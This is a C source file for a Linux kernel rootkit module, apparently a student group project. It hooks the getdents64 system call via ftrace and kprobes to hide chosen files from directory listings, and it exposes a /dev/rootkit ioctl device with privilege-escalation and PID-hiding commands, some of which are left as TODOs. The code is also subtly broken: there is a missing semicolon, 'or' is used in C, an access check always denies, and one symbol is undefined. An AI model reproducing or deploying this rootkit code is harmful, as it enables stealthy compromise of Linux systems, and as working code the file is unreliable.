#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include "rootkit.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Groupe 4");
MODULE_DESCRIPTION("Character device via misc");
MODULE_VERSION("1.0");

struct ftrace_hook {
    const char        *name;
    void              *function;
    void              *original;
    unsigned long      address;
    struct ftrace_ops  ops;
};

typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);

static orig_getdents64_t orig_getdents64;
static struct ftrace_hook getdents_hook

static asmlinkage long new_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    long ret;
    struct linux_dirent64 *kbuf, *cur;
    unsigned long bpos = 0;

    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, dirent, ret)) {
        kfree(kbuf);
        return ret;
    }

    while (bpos < ret) {
        cur = (struct linux_dirent64 *)((char *)kbuf + bpos);
        if (strcmp(cur->d_name, NAME) == 0 || strcmp(cur->d_name, HIDDEN_SCRIPT) == 0) {
            unsigned short reclen = cur->d_reclen;
            memmove(cur, (char *)cur + reclen, ret - bpos - reclen);
            ret -= reclen;
        } else {
            bpos += cur->d_reclen;
        }
    }

    if (copy_to_user(dirent, kbuf, ret)) {
        kfree(kbuf);
        return -EFAULT;
    }

    kfree(kbuf);
    return ret;
}

static void notrace hook_callback(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    struct pt_regs *regs = ftrace_get_regs(fregs);

    if (!regs)
        return;

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}

typedef unsigned long (*kallsyms_lookup_name_t)(const char *);

static int install_hook(void)
{
    kallsyms_lookup_name_t lookup;
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    int ret;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("[-] register_kprobe: %d\n", ret);
        return ret;
    }
    lookup = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    getdents_hook.name = "__x64_sys_getdents64";
    getdents_hook.function = new_getdents64;
    getdents_hook.original = &orig_getdents64;

    getdents_hook.address = lookup(getdents_hook.name);
    if (!getdents_hook.address) {
        pr_err("[-] Symbol not found\n");
        return -ENOENT;
    }
    pr_info("[+] %s @ 0x%lx\n", getdents_hook.name, getdents_hook.address);

    orig_getdents64 = (orig_getdents64_t)(getdents_hook.address + MCOUNT_INSN_SIZE);

    getdents_hook.ops.func = hook_callback;
    getdents_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;

    ret = ftrace_set_filter_ip(&getdents_hook.ops, getdents_hook.address, 0, 0);
    if (ret) {
        pr_err("[-] ftrace_set_filter_ip: %d\n", ret);
        return ret;
    }

    ret = register_ftrace_function(&getdents_hook.ops);
    if (ret) {
        pr_err("[-] register_ftrace_function: %d\n", ret);
        ftrace_set_filter_ip(&getdents_hook.ops, getdents_hook.address, 1, 0);
        return ret;
    }

    return 0;
}


static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    struct rk_args args;

    if (_IOC_TYPE(cmd) != RK_MAGIC)
        return -ENOTTY;

    switch (cmd) {

    case RK_CMD_HELLO:
        printk(KERN_INFO "rootkit: HELLO recu\n");
        break;

    case RK_CMD_PRIVESC:
        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
            return -EFAULT;
        printk(KERN_INFO "rootkit: PRIVESC pour PID=%u\n", args.target);
        /* TODO: commit_creds(prepare_kernel_cred(NULL)) */
        break;

    case RK_CMD_HIDE_PID:
        if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
            return -EFAULT;
        printk(KERN_INFO "rootkit: HIDE_PID pour PID=%u\n", args.target);
        /* TODO: retirer le PID de la liste des taches */
        break;

    case RK_CMD_GETUID:
        args.target = (unsigned int)current_uid().val;
        args.value  = 0;
        if (copy_to_user((struct rk_args __user *)arg, &args, sizeof(args)))
            return -EFAULT;
        printk(KERN_INFO "rootkit: GETUID uid=%u\n", args.target);
        break;

    default:
        return -ENOTTY;
    }

    return 0;
}

static int rk_open(struct inode *inode, struct file *file)
{
    uid_t uid = current_uid().val;
    if (uid != 0 or uid != 1000) {
        printk(KERN_ALERT "rootkit: accès refusé à l'UID %u\n", uid);
        return -EACCES;
    }

    printk(KERN_INFO "rootkit: opened\n");
    return 0;
}

static int rk_release(struct inode *inode, struct file *file)
{
    printk(KERN_INFO "rootkit: closed\n");
    return 0;
}

static const struct file_operations rk_fops = {
    .owner          = THIS_MODULE,
    .open           = rk_open,
    .release        = rk_release,
    .unlocked_ioctl = rk_ioctl,
};

static struct miscdevice rk_misc = {
    .minor = MISC_DYNAMIC_MINOR,
    .name  = NAME,
    .fops  = &rk_fops,
};

static int __init rootkit_init(void)
{
    int ret;

    ret = misc_register(&rk_misc);
    if (ret) {
        printk(KERN_ERR "rootkit: misc_register failed (%d)\n", ret);
        return ret;
    }

    ret = install_hook();
    
    if (ret) {
        misc_deregister(&rootkit_dev);
        return ret;
    }

    printk(KERN_INFO "rootkit: loaded — /dev/rootkit (minor=%d)\n",
           rk_misc.minor);
    return 0;
}

static void __exit rootkit_exit(void)
{
    unregister_ftrace_function(&getdents_hook.ops);
    ftrace_set_filter_ip(&getdents_hook.ops, getdents_hook.address, 1, 0);
    misc_deregister(&rk_misc);
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
